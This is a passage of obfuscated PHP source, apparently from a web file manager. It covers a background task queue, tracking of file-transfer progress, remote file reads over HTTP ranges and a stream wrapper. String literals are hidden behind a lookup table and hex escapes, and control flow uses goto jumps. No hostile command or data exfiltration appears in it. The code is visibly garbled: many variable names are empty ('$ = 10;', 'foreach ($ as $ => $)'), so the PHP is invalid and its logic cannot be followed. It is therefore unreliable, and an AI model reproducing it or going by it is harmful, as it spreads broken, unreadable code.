private static function taskQueueRun($ݸȥ) { $ = 10; while (!0) { $ɷ = TaskQueue::run(); if ($ɷ === !1) { break; } if (timeFloat() - $ݸȥ >= $) { break; } } } private static function taskTimeCheck($) { $ݎ =& $_SERVER[ܮ]; $è = json_decode($[$ݎ[204]], !0); $퇞 = intval($[$ݎ[1928]]); $Ʒ = strtotime($ݎ[1949] . $è[$ݎ[1950]] . $ݎ[1951]) - strtotime($ݎ[1952]); $೗ = time() - strtotime(date($ݎ[1953]) . $ݎ[1954]); $¼ = $೗ >= $Ʒ && $೗ <= $Ʒ + 3600; switch ($è[$ݎ[33]]) { case $ݎ[1955]: if (time() - $퇞 < 3600 * 24 * 30) { return !1; } if ($è[$ݎ[1955]] == date($ݎ[1956]) && $¼) { return !0; } break; case $ݎ[1957]: if (time() - $퇞 < 3600 * 24 * 7) { return !1; } $£ = date($ݎ[1958]) == 0 ? 7 : date($ݎ[1958]); if ($è[$ݎ[1957]] == $£ && $¼) { return !0; } break; case $ݎ[1950]: if (time() - $퇞 < 3600 * 24) { return !1; } if ($¼) { return !0; } break; case $ݎ[1959]: if (time() - $퇞 >= floatval($è[$ݎ[1959]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ⱔ =& $_SERVER[ܮ]; static $с = 0; $Δ = 300; if (!$с) { $с = time(); } if (time() - $с < $Δ) { return; } $с = time(); $ = Model($Ⱔ[597])->db($Ⱔ[12]); if ($) { $->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ⱔ[1960], $Ⱔ[1961]); die; } } public static function taskRun($̢) { $Ѣ =& $_SERVER[ܮ]; self::log($Ѣ[1962] . $̢[$Ѣ[487]] . $Ѣ[1963] . $̢[$Ѣ[32]] . $Ѣ[1964] . $̢[$Ѣ[1564]]); Model($Ѣ[1946])->run($̢[$Ѣ[487]]); $ճ = timeFloat(); $ = $Ѣ[12]; switch ($̢[$Ѣ[33]]) { case $Ѣ[382]: $Ó = url_request($̢[$Ѣ[1564]], $Ѣ[1606], !1, !1, !1, !1, 10); if ($Ó[$Ѣ[848]]) { $ = strlen($Ó[$Ѣ[1393]]); } break; case $Ѣ[1965]: $ = Hook::apply($̢[$Ѣ[1564]]); default: break; } Model($Ѣ[1966])->add(array($Ѣ[1967] => $Ѣ[12], $Ѣ[1968] => $Ѣ[228], $Ѣ[33] => $Ѣ[1969] . $̢[$Ѣ[487]], $Ѣ[1970] => json_encode(array($Ѣ[32] => $̢[$Ѣ[32]], $Ѣ[1971] => timeFloat() - $ճ, $Ѣ[854] => $)))); $ = $ ? $Ѣ[1972] . $ : $Ѣ[12]; self::log($Ѣ[1973] . $̢[$Ѣ[487]] . $Ѣ[175] . $); return !0; } public static function valueGet($) { $ =& $_SERVER[ܮ]; $ = $[1974]; $ɳӭ = Model($[522])->get($, $); if (is_null($ɳӭ)) { Model($[522])->set($[848], $[91], $); Model($[522])->set($[945], $[228], $); $ɳӭ = Model($[522])->get($, $); } return $ɳӭ; } private static function valueSet($, $ = false) { $ =& $_SERVER[ܮ]; $횦܂ = $[1975]; CacheLock::lock($횦܂); $ = Model($[522])->set($, $, $[1974]); CacheLock::unlock($횦܂); return $; } protected static function log($欄) { write_log($欄, $_SERVER[ܮ][1961]); } private static function cacheClear() { $ݽ =& $_SERVER[ܮ]; Cache::clearMemory(Model($ݽ[522])->cacheKey($ݽ[1974])); Cache::clearMemory(Model($ݽ[522])->cacheKey($ݽ[1976])); Model($ݽ[1946])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\156\156\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ṡ, $Ϩ = '', $¡ = 0, $׬ = '') { $е· =& $_SERVER[ܮ]; if (self::get($ṡ)) { return; } $this->task = array($е·[487] => $ṡ, $е·[1593] => USER_ID, $е·[1866] => $׬, $е·[540] => $е·[12], $е·[33] => $Ϩ, $е·[1234] => $е·[12], $е·[1232] => $¡, $е·[1977] => 0, $е·[1978] => 0, $е·[1979] => 0, $е·[1980] => timeFloat(), $е·[1981] => 0, $е·[1982] => 0, $е·[1983] => 0, $е·[1984] => 0, $е·[848] => $е·[945]); $GLOBALS[$е·[1985]] = 1; Hook::bind($е·[1931], array($this, $е·[1986])); Hook::bind($е·[1987], array($this, $е·[1988])); $this->startAfter(); Hook::trigger($е·[1989], $this->task); $this->task[$е·[1982]] = timeFloat(); } public function end($眞ǫ = '') { $ˎ =& $_SERVER[ܮ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ˎ[1982]]) { self::valueSet($this->task[$ˎ[487]], !1); } $this->isEnd = !0; if ($眞ǫ) { $this->task[$ˎ[540]] = $眞ǫ; } self::log($ˎ[1990] . $this->task[$ˎ[487]] . $ˎ[1991] . sprintf($ˎ[1014], timeFloat() - $this->task[$ˎ[1980]]) . $ˎ[1992]); Hook::unbind($ˎ[1931], array($this, $ˎ[1986])); Hook::unbind($ˎ[1987], array($this, $ˎ[1988])); $this->endAfter(); $ء = $this->task; $this->task = !1; Hook::trigger($ˎ[1993], $ء); } public function update($É = 0, $ʆ = false) { $כ =& $_SERVER[ܮ]; $Ī =& $this->task; if (!$Ī) { return; } $Ī[$כ[1977]] += $É; $Ī[$כ[1981]] = timeFloat(); if ($Ī[$כ[1232]]) { if ($Ī[$כ[1232]] < $Ī[$כ[1977]]) { $Ī[$כ[1232]] = $Ī[$כ[1977]]; } $ = timeFloat() - $Ī[$כ[1980]] - $Ī[$כ[1983]]; if ($ <= 0) { $ = 0.001; } $Ī[$כ[1978]] = $Ī[$כ[1977]] / $Ī[$כ[1232]]; $Ī[$כ[1979]] = $Ī[$כ[1977]] / $; if ($Ī[$כ[1978]] > 0) { $Ī[$כ[1984]] = $ * (1 - $Ī[$כ[1978]]) / $Ī[$כ[1978]]; } $Ī[$כ[1984]] = $Ī[$כ[1984]] <= 0 ? 0 : $Ī[$כ[1984]]; } $this->updateAfter(); $ꏏ = 0.2; if (timeFloat() - $Ī[$כ[1982]] < $ꏏ && !$ʆ) { return; } $Ҡ = self::get($Ī[$כ[487]]); $ = $Ҡ[$כ[848]]; if ($ == self::STATYS_KILL) { $ = array($כ[1994] => LNG($כ[1995]), $כ[1403] => !1); Cache::set($כ[1996] . $this->task[$כ[487]], $, 30); $this->onKill(); $this->end(); die; } else { if ($ == self::STATYS_STOP) { $ = 2; $Ҡ[$כ[1983]] += $; self::valueSet($Ī[$כ[487]], $Ҡ); sleep($); $this->update(); return; } } $Ī[$כ[848]] = $ ? $ : $Ī[$כ[848]]; $Ī[$כ[1983]] = $Ҡ[$כ[1983]] ? $Ҡ[$כ[1983]] : 0; $Ī[$כ[1982]] = timeFloat(); Hook::trigger($כ[1997], $Ī); self::valueSet($Ī[$כ[487]], $Ī); } public function onKillSet($ϟ, $ = array()) { $this->onKillCall = array($ϟ, $); } public function onKill() { $ɵڌ =& $_SERVER[ܮ]; self::log($ɵڌ[1990] . $this->task[$ɵڌ[487]] . $ɵڌ[1998]); Hook::trigger($ɵڌ[1999], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ӗ) { $ =& $_SERVER[ܮ]; Cache::set($[1996] . $this->task[$[487]], $ӗ, 60); if (!is_array($ӗ) || !$ӗ[$[1403]]) { self::log($[2000] . json_encode($ӗ)); } return $ӗ; } public static function get($烽) { $ =& $_SERVER[ܮ]; $ް = self::valueGet($烽); if (is_array($ް) && $ް[$[2001]]) { $ղ = ActionApply($ް[$[2001]], array($ް)); $ް = is_array($ղ) ? $ղ : $ް; } return $ް; } public static function listData() { $捌 = self::valueGet(); return array_sort_by($捌, $_SERVER[ܮ][1980], !0); } public static function kill($) { return self::changeStatus($, self::STATYS_KILL); } public static function stop($ӷ) { return self::changeStatus($ӷ, self::STATYS_STOP); } public static function restart($) { return self::changeStatus($, self::STATYS_RUNNING); } public static function killAll() { $給 =& $_SERVER[ܮ]; $ = self::listData(); foreach ($ as $獶) { self::kill($獶[$給[487]]); } sleep(2); foreach ($ as $獶) { self::valueSet($獶[$給[487]], !1); } } private static function changeStatus($, $߹) { $ǉ =& $_SERVER[ܮ]; $쭖 = self::valueGet($); if (!$쭖) { return !1; } $쭖[$ǉ[848]] = $߹; self::valueSet($, $쭖); self::log($ǉ[2002] . $쭖[$ǉ[487]] . $ǉ[2003] . $߹); return !0; } public static function valueGet($缨 = false) { $읾 =& $_SERVER[ܮ]; if ($缨) { $ = Model($읾[534])->where(array($읾[95] => $缨, $읾[33] => $읾[1241]))->find(); return $ ? json_decode($[$읾[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ = false) { $Ӧ =& $_SERVER[ܮ]; $ = array($Ӧ[33] => $Ӧ[1241]); if ($) { $[$Ӧ[1593]] = $; } $ˁ = Model($Ӧ[534])->where($)->select(); $ˁ = $ˁ ? $ˁ : array(); foreach ($ˁ as $ => $) { $ˁ[$] = json_decode($[$Ӧ[451]], !0); } return $ˁ; } public static function valueSet($Ã, $) { $Ҥ =& $_SERVER[ܮ]; if (!$) { return Model($Ҥ[534])->where(array($Ҥ[95] => $Ã, $Ҥ[33] => $Ҥ[1241]))->delete(); } $⿛ = json_encode($); if (!$⿛) { ob_start(); var_dump($); $ = ob_get_clean(); self::log($Ҥ[2004] . json_encode_force($)); } if (!$Ã || !$[$Ҥ[487]]) { return !1; } $ӂѼ = array($Ҥ[33] => $Ҥ[1241], $Ҥ[1593] => USER_ID, $Ҥ[95] => $Ã, $Ҥ[451] => $⿛); $ݔ = $Ҥ[2005]; CacheLock::lock($ݔ); Model($Ҥ[534])->add($ӂѼ, array(), !0); CacheLock::unlock($ݔ); } public static function log($) { if (!GLOBAL_DEBUG) { return; } write_log($, $_SERVER[ܮ][2006]); } } class TaskFileTransfer extends Task { protected function startAfter() { $׋ =& $_SERVER[ܮ]; $Χ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($׋[2007], array($this, $׋[2008])); Hook::bind($׋[1414], array($this, $׋[2009])); Hook::bind($׋[2010], array($this, $׋[2011])); Hook::bind($׋[690], array($this, $׋[2012])); Hook::bind($׋[691], array($this, $׋[2013])); Hook::bind($׋[697], array($this, $׋[2014])); Hook::bind($׋[698], array($this, $׋[2015])); Hook::bind($׋[693], array($this, $׋[2016])); Hook::bind($׋[695], array($this, $׋[2017])); Hook::bind($׋[659], array($this, $׋[2018])); Hook::bind($׋[656], array($this, $׋[2018])); Hook::bind($׋[661], array($this, $׋[2018])); Hook::bind($׋[663], array($this, $׋[2018])); Hook::bind($׋[665], array($this, $׋[2018])); Hook::bind($׋[2019], array($this, $׋[2020])); Hook::bind($׋[681], array($this, $׋[2021])); $this->sourceModelCopyFlag = !1; Hook::bind($׋[2022], array($this, $׋[2023])); Hook::bind($׋[2024], array($this, $׋[2025])); Hook::bind($׋[2026], array($this, $׋[2027])); $Χ[$׋[2028]] = LNG($׋[2029]); $Χ[$׋[2030]] = 0; $Χ[$׋[2031]] = 0; $Χ[$׋[1234]] = $׋[12]; $Χ[$׋[2032]] = $׋[12]; $Χ[$׋[2033]] = 0; $Χ[$׋[2034]] = 0; $Χ[$׋[947]] = 0; if (!$Χ[$׋[1866]]) { $Χ[$׋[1866]] = LNG($׋[2035]); } } protected function endAfter() { $ҩ =& $_SERVER[ܮ]; Hook::unbind($ҩ[2007], array($this, $ҩ[2008])); Hook::unbind($ҩ[1414], array($this, $ҩ[2009])); Hook::unbind($ҩ[2010], array($this, $ҩ[2011])); Hook::unbind($ҩ[690], array($this, $ҩ[2012])); Hook::unbind($ҩ[691], array($this, $ҩ[2013])); Hook::unbind($ҩ[697], array($this, $ҩ[2014])); Hook::unbind($ҩ[698], array($this, $ҩ[2015])); Hook::unbind($ҩ[693], array($this, $ҩ[2016])); Hook::unbind($ҩ[695], array($this, $ҩ[2017])); Hook::unbind($ҩ[659], array($this, $ҩ[2018])); Hook::unbind($ҩ[656], array($this, $ҩ[2018])); Hook::unbind($ҩ[661], array($this, $ҩ[2018])); Hook::unbind($ҩ[663], array($this, $ҩ[2018])); Hook::unbind($ҩ[665], array($this, $ҩ[2018])); Hook::unbind($ҩ[2019], array($this, $ҩ[2020])); Hook::unbind($ҩ[681], array($this, $ҩ[2021])); Hook::unbind($ҩ[2022], array($this, $ҩ[2023])); Hook::unbind($ҩ[2024], array($this, $ҩ[2025])); Hook::unbind($ҩ[2026], array($this, $ҩ[2027])); } public function copyMoveStart($ϥ, $؏, $츄, $׾) { $ =& $_SERVER[ܮ]; self::log($[2036] . $؏ . $[73] . $׾); $ŗ = rtrim(TEMP_FILES, $[8]); if (substr($؏, 0, strlen($ŗ)) == $ŗ) { return; } if (substr($׾, 0, strlen($ŗ)) == $ŗ) { return; } $ =& $this->task; $[$[2037]] = KodIO::transferType($ϥ, $츄); self::log($[2038] . $[$[2037]] . $[74] . $؏ . $[73] . $׾); $this->update(); } public function updateAfter() { $ =& $_SERVER[ܮ]; $ښ =& $this->task; if (!$ښ[$[862]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ښ[$[2037]] == $[1515]) { return; } self::updateTask($ښ); } private static function updateTask(&$) { $ؕ =& $_SERVER[ܮ]; if ($[$ؕ[2037]] == $ؕ[1386] || $[$ؕ[2037]] == $ؕ[107]) { if ($[$ؕ[2032]]) { $[$ؕ[947]] = $[$ؕ[2034]] + $[$ؕ[2031]]; } } else { if ($[$ؕ[2037]] == $ؕ[1516]) { if ($[$ؕ[2032]] == $ؕ[1386]) { $[$ؕ[947]] = $[$ؕ[2034]] + $[$ؕ[2031]] * 0.5; } else { if ($[$ؕ[2032]] == $ؕ[107]) { $[$ؕ[947]] = $[$ؕ[2034]] + $[$ؕ[2030]] * 0.5 + $[$ؕ[2031]] * 0.5; } } } } $[$ؕ[1978]] = $[$ؕ[947]] / $[$ؕ[862]]; if ($[$ؕ[1978]] > 0) { $ס = timeFloat() - $[$ؕ[1980]] - $[$ؕ[1983]]; $[$ؕ[1984]] = $ס * (1 - $[$ؕ[1978]]) / $[$ؕ[1978]]; } $҈ާ = $[$ؕ[2031]] . $ؕ[998] . $[$ؕ[2030]] . "\x3b\x20{$}\x3b" . $[$ؕ[947]]; self::log($ؕ[2039] . $[$ؕ[2032]] . $ؕ[74] . $[$ؕ[1978]] . $ؕ[74] . $҈ާ); } public function addPath($ȼ) { $ =& $_SERVER[ܮ]; if (!$ȼ) { return; } $ =& $this->task; $ޟ = IO::infoWithChildren($ȼ); $쟺 = $[$[2040]] ? $[$[2040]][$[2041]] : 0; $[$[2040]] = array($[2041] => $쟺 + 1, $[509] => $ޟ[$[32]], $[87] => $ޟ[$[87]], $[602] => $ޟ[$[602]] ? $ޟ[$[602]] : $ޟ[$[87]]); if ($ޟ[$[33]] == $[230]) { $[$[1232]] += 1; } else { $[$[1232]] += $ޟ[$[82]][$[80]]; if ($ޟ[$[191]]) { $[$[1232]] += $ޟ[$[82]][$[81]] + 1; } } $[$[862]] += $ޟ[$[79]]; $this->update(); self::log(array($[2042] . $ȼ, $ޟ)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($) { } public function sourceAddHashEnd($逫) { } public function sourceAddFileStart($) { $̹ =& $_SERVER[ܮ]; $ =& $this->task; $[$̹[2030]] = $[$̹[79]]; $[$̹[2028]] = $[$̹[32]]; $[$̹[1234]] = $[$̹[32]]; $[$̹[2043]] = $[$̹[87]]; $this->update(); self::log($̹[2044] . $[$̹[87]] . $̹[2045] . $[$̹[79]]); } public function sourceAddFileEnd($߶) { $ƭ =& $_SERVER[ܮ]; $Źǥ =& $this->task; $Źǥ[$ƭ[947]] += $߶[$ƭ[79]]; $Źǥ[$ƭ[2043]] = $߶[$ƭ[87]]; $this->update(1); self::log($ƭ[2046] . $߶[$ƭ[87]] . $ƭ[2045] . $߶[$ƭ[79]] . $ƭ[2047]); } public function copyFileStart($ր, $ᶡ, $, $ʍצ, $ؐ, $) { $żا =& $_SERVER[ܮ]; $ǼĴ = $ؐ; if ($ǼĴ == $GLOBALS[$żا[2048]]) { $ǼĴ = $GLOBALS[$żا[2049]]; } $GLOBALS[$żا[2049]] = $ؐ; $GLOBALS[$żا[2048]] = $; $ =& $this->task; $[$żا[2028]] = $ǼĴ; $[$żا[2030]] = (int) $ր->size($ᶡ); $[$żا[2031]] = 0; $[$żا[1234]] = $żا[12]; $[$żا[2032]] = $żا[12]; $[$żا[2033]] = 0; $ᙈ = $[$żا[2030]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($[$żا[487]] . $żا[2050]); if ($ᙈ && file_exists(get_path_father($ʍצ))) { Cache::set($[$żا[487]] . $żا[2050], $ʍצ); $[$żا[2001]] = array($żا[2051], $żا[2052]); } $this->update(0, $ᙈ); self::log("\143\157\160\x79\x46\151\154\x65\x53\x74\141\162\164\x3a{$ᶡ}\73"); } public static function updateCopyLocalFileSize($忈) { $ =& $_SERVER[ܮ]; $֟ = Cache::get($忈[$[487]] . $[2050]); if (!$֟ || !file_exists($֟)) { return $忈; } $忈[$[2031]] = @filesize($֟); $忈[$[947]] += $忈[$[2031]]; self::updateTask($忈); return $忈; } public function copyFileEnd($ד͎, $͡, $±, $ͷ, $, $̦) { $ԟܗ =& $_SERVER[ܮ]; $٤ =& $this->task; $٤[$ԟܗ[2031]] = $٤[$ԟܗ[2030]]; $٤[$ԟܗ[2032]] = $ԟܗ[12]; unset($٤[$ԟܗ[2001]]); if ($ == $٤[$ԟܗ[2028]]) { $٤[$ԟܗ[2034]] += $٤[$ԟܗ[2030]]; $٤[$ԟܗ[947]] = $٤[$ԟܗ[2034]]; $ = 1; if (isset($٤[$ԟܗ[2043]]) && $٤[$ԟܗ[2043]] == $͡) { $ = 0; } $this->update($); } else { $this->update(); $٤[$ԟܗ[2031]] = 0; } Cache::remove($٤[$ԟܗ[487]] . $ԟܗ[2050]); self::log($ԟܗ[2053] . $͡ . $ԟܗ[73] . $ͷ . $ԟܗ[285] . $ . $ԟܗ[2054] . $٤[$ԟܗ[2028]]); } public function updateFileEnd($, $ٳ) { $Ձ =& $_SERVER[ܮ]; $򕕤 =& $this->task; $򕕤[$Ձ[2028]] = $; $򕕤[$Ձ[2030]] = $ٳ; $򕕤[$Ձ[2034]] += $ٳ; $򕕤[$Ձ[947]] = $򕕤[$Ձ[2034]]; $this->update(1); self::log($Ձ[2055] . $); } public function sourceModelCopy($ز) { $ߍ̺ =& $_SERVER[ܮ]; $Ȋ = $ز[0]; $ = $ز[1]; $ =& $this->task; $this->sourceModelCopyFlag = !0; $˟ = 0; switch ($Ȋ) { case $ߍ̺[657]: $˟ = 1; break; case $ߍ̺[660]: $[$ߍ̺[2028]] = $[$ߍ̺[32]]; break; case $ߍ̺[662]: $˟ = intval($ز[$ߍ̺[467]] * 0.4); break; case $ߍ̺[664]: $˟ = intval($ز[$ߍ̺[467]] * 0.2); break; case $ߍ̺[666]: $˟ = intval($ز[$ߍ̺[467]] * 0.4); break; } $this->update($˟); self::log(array("{$Ȋ}\73\141\144\144\x3d{$˟}", $ز)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ڕ, $) { $܅ =& $_SERVER[ܮ]; $this->sourceModelCopyFlag = !0; $ʱ = 1; if (isset($ڕ[$܅[82]])) { $ʱ = $ڕ[$܅[82]][$܅[80]]; $ʱ = $ʱ + $ڕ[$܅[82]][$܅[81]] + 1; } $this->update($ʱ); $this->sourceModelCopyFlag = !1; $this->log(array($܅[2056], $ʱ, $ڕ)); } public function sourceMove($) { $this->sourceRemove($, !1); } public function curlProgress($, $փ, $, $ޏ, $) { $ =& $_SERVER[ܮ]; $ =& $this->task; if ($ > 0) { $[$[1234]] = $[2057]; $[$[2032]] = $[107]; if ($[$[2030]]) { $[$[2031]] = $; } if ($[$[2033]]) { $[$[2031]] = $ + $[$[2033]]; } } else { if ($ > 0) { if ($[$[2030]] == $փ) { $[$[2031]] = $; $[$[1234]] = $[2058]; $[$[2032]] = $[1386]; } } } $this->update(); $ۏ = "\144\x6f\x77\x6e\72{$}\57{$փ}\x3b\x20\165\x70\x6c\157\141\144\x3a{$}\x2f{$ޏ}\73\146\151\154\145\x3d" . $[$[2030]]; self::log(array($[2059] . $ۏ . $[74] . $[$[2028]], curl_getinfo($))); } public function curlProgressStart($ب) { } public function curlProgressEnd($) { $ =& $_SERVER[ܮ]; $ =& $this->task; $ = curl_getinfo($); $æ = $[$[2060]]; if ($æ == -1) { $æ = $[$[2061]]; } if ($[$[2032]] == $[107] && $æ) { $[$[2033]] += $æ; } $this->update(); } } goto e; AĈ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($̬ǧ = false) { } public function exist($Ȓ) { $ڕܨ = $this->info($Ȓ); return $ڕܨ[$_SERVER[ܮ][232]]; } public function isFile($˛) { $א = $this->info($˛); return $א[$_SERVER[ܮ][232]]; } public function isFolder($) { return !1; } public function size($) { $ = $this->info($); return $[$_SERVER[ܮ][79]]; } public function info($) { return $this->infoParse($); } public function infoAuth($م) { return $this->infoParse($م); } public function infoWithChildren($) { return $this->infoParse($); } public function infoFull($ႅ) { return $this->infoParse($ႅ); } private function infoParse($ĩ) { $ֵ =& $_SERVER[ܮ]; $Ô = $this->header($ĩ); if (!$Ô || !$Ô[$ֵ[848]]) { return !1; } $ = _get($Ô, $ֵ[412], 0); $ = array($ֵ[32] => $Ô[$ֵ[32]], $ֵ[87] => $ĩ, $ֵ[33] => $ֵ[230], $ֵ[79] => intval($), $ֵ[166] => get_path_ext($Ô[$ֵ[32]]), $ֵ[1664] => $ > 0 && $Ô[$ֵ[1810]], $ֵ[1665] => !1); return $; } private function header($ە) { $ =& $_SERVER[ܮ]; if (isset(self::$_cacheHeader[$ە])) { return self::$_cacheHeader[$ە]; } $ = isset($GLOBALS[$[1811]]) ? $GLOBALS[$[1811]] : !1; $GLOBALS[$[1811]] = !0; self::$_cacheHeader[$ە] = url_header($ە); $GLOBALS[$[1811]] = $; return self::$_cacheHeader[$ە]; } public function hashSimple($, $ = false) { $ =& $_SERVER[ܮ]; $ = $this->info($); if (!$ || !$[$[232]]) { return !1; } $ = $[$[79]]; $Ꮲ = 200; $ = 50; if ($ <= $Ꮲ * $) { return md5($this->fileSubstr($, 0, $)) . $; } $ᩴ = intval($ / $); $԰ = $[12]; $ĥ = timeFloat(); $ן̰ = 15; for ($䀵 = 0; $䀵 < $; $䀵++) { if (timeFloat() - $ĥ > $ן̰) { return !1; } $ = $this->fileSubstr($, $ᩴ * $䀵, $Ꮲ); if (!$) { return !1; } $԰ .= $; } $԰ .= $this->fileSubstr($, $ - $Ꮲ, $Ꮲ); return md5($԰) . $; } public function getContent($) { return $this->fileSubstr($); } public function fileSubstr($, $̟ = 0, $ͬ = -1) { $ =& $_SERVER[ܮ]; $ւ = $this->info($); if (!$ւ || !$ւ[$[232]] && $ւ[$[79]] > 1024 * 1024 * 10) { return !1; } if ($ͬ === -1) { $ͬ = $ւ[$[79]]; } if ($ͬ == 0) { return $[12]; } $ = array($[1812] . $̟ . $[886] . ($̟ + $ͬ - 1)); $֏ = url_request($, $[1606], !1, $, !1, !1, 30); return $֏[$[1393]] ? $֏[$[1393]] : $[12]; } public function download($̐ӽ, $) { Downloader::start($̐ӽ, $); return $; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($҆, $ո = '') { $this->info = $this->info($҆); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ܮ][87]]; $this->pathOpen = $҆; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$҆])) { self::$_chunkBuffer[$҆] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($钫) { $㙎 = $this->fileSubstr($this->pose, $钫); $this->pose += strlen($㙎); return $㙎; } public function stream_tell() { return $this->pose; } public function stream_seek($, $ə) { $ =& $_SERVER[ܮ]; if ($ə == SEEK_SET) { $this->pose = $; } else { if ($ə == SEEK_CUR) { $this->pose += $; } else { if ($ə == SEEK_END) { $this->pose = $this->info[$[79]] + intval($); } } } if ($ < 0) { $this->pose = $this->info[$[79]] + $; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ܮ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ŋ, $ʙ) { $붦 =& $_SERVER[ܮ]; $Ϝ = $this->info($ŋ); return array($붦[1513] => 0, $붦[1813] => 0, $붦[16] => 32768 + 511, $붦[1814] => 0, $붦[1815] => 0, $붦[1816] => 0, $붦[1817] => 0, $붦[79] => $Ϝ[$붦[79]], $붦[1818] => $Ϝ[$붦[1663]], $붦[1775] => $Ϝ[$붦[88]], $붦[1774] => $Ϝ[$붦[231]], $붦[1819] => 0, $붦[1820] => 0); } static $fileInfo = array(); public function info($) { $żʶ = $_SERVER[ܮ][1821]; if (isset(self::$fileInfo[$])) { return self::$fileInfo[$]; } if (substr($, 0, strlen($żʶ)) != $żʶ) { return !1; } self::$fileInfo[$] = IO::info(substr($, strlen($żʶ))); return self::$fileInfo[$]; } public static function read($, $Ä, $厩) { if (!isset(self::$_fopenCache[$])) { $ = new StreamWrapperIO(); $->stream_open($); self::$_fopenCache[$] = $; } $ = self::$_fopenCache[$]; return $->fileSubstr($Ä, $厩); } public static function _read($, $ʶ, $ڬ) { $񰽂 =& $_SERVER[ܮ]; $ٙ = fopen($, $񰽂[1667]); if (!$ٙ) { return $񰽂[12]; } $֝ = 8192; fseek($ٙ, $ʶ, SEEK_SET); $ = $񰽂[12]; $ = 0; while ($ < $ڬ) { $Ž = min($֝, $ڬ - $); $ .= fread($ٙ, $Ž); $ += $Ž; } fclose($ٙ); return $; } public function fileSubstr($Ƚ, $֞) { $ߌ =& $_SERVER[ܮ]; $ = $this->info[$ߌ[79]]; $ = $Ƚ; $ľ = $֞; if ($Ƚ < 0) { $Ƚ = $ + $Ƚ; } if ($֞ === !1) { $֞ = $ - $Ƚ; } if ($Ƚ + $֞ > $) { $֞ = $ - $Ƚ; } if ($֞ <= 0) { return $ߌ[12]; } if ($Ƚ < 0 || $Ƚ >= $ || $֞ <= 0 || $֞ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\154\x65\122\145\141\144\x20\145\x72\162\157\162\41\40\163\x74\141\x72\164\x3d{$Ƚ}\x3b\x6c\145\x6e\x67\x74\x68\75{$֞}\73\40\163\151\x7a\x65\75{$}\x3b"); } $ۥׅ = 64 * 1024; $ =& self::$_chunkBuffer[$this->path]; if (!$) { $ = array(); } $ = 0; $ = 0; $ʴ = $ߌ[12]; foreach ($ as $ => $ʴ) { $ = intval($); $ = $ + strlen($ʴ); if ($Ƚ >= $) { continue; } if ($Ƚ >= $ && $Ƚ + $֞ <= $) { return substr($ʴ, $Ƚ - $, $֞); } break; } if (count($) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ߌ[1822], $ߌ[1823] . count($) . "\x3b\x73\x74\141\162\x74\x3d{$Ƚ}\x2c\154\x65\x6e\x67\x74\x68\75{$֞}\73\160\157\163\145\72{$}\176{$}"); throw new Exception($ߌ[1824]); } $ = intval($Ƚ / $ۥׅ) * $ۥׅ; $ = ceil(($Ƚ + $֞) / $ۥׅ) * $ۥׅ - $; $ = IO::fileSubstr($this->path, $, $); $[$ . $ߌ[12]] = $; ksort($); $ = substr($, $Ƚ - $, $֞); return $; } private function log($, $خ) { $Ɲ֊ =& $_SERVER[ܮ]; $ = timeFloat() - $this->timeStart; write_log(sprintf($Ɲ֊[1825], $, $this->info[$Ɲ֊[32]], $, $خ), $Ɲ֊[1371]); } } class Message { function __construct() { } public function send($ = '', $ݥ = array(), $ = "\x74\145\170\164") { $­ =& $_SERVER[ܮ]; $ = array($­[33] => $­[1291], $­[168] => $); if (in_array($, array($­[1291], $­[1826]))) { $[$­[33]] = $; } $ݥ = array($­[598] => isset($ݥ[$­[598]]) ? $ݥ[$­[598]] : $­[12], $­[684] => isset($ݥ[$­[684]]) ? $ݥ[$­[684]] : $­[12]); if (empty($) || empty($ݥ[$­[598]]) && empty($ݥ[$­[684]])) { return !1; } $ = array($­[1755] => $, $­[1827] => $ݥ); Hook::trigger($­[1828], $); } } goto BŶ; Eŝ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\163\164\x6f\x72\x61\147\145\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\163\x69\x7a\145\x4d\141\170", "\163\171\163\164\145\x6d", "\x64\x65\146\141\165\x6c\164", "\x64\x72\151\x76\145\x72", "\143\x6f\x6e\x66\x69\147"); public function listData($ = false, $ = "\155\x6f\144\151\146\171\x54\x69\155\145", $텸 = false) { $ =& $_SERVER[ܮ]; $ = parent::listData($, $, $텸); if ($) { return $; } $ˀٰ = array(); if ($GLOBALS[$[2513]]) { $ˀٰ = $this->ioSizeUseGet(array_to_keyvalue($, $[12], $[487])); } foreach ($ as $ɐڛ => $ǩ) { unset($[$ɐڛ][$[6]]); $[$ɐڛ][$[2170]] = isset($ˀٰ[$ǩ[$[487]]]) ? $ˀٰ[$ǩ[$[487]]] : 0; } return $; } public function ioSizeUseGet($ј̇) { $ =& $_SERVER[ܮ]; if (!$ј̇) { return array(); } $ = $[2514] . implode($[50], $ј̇); $ 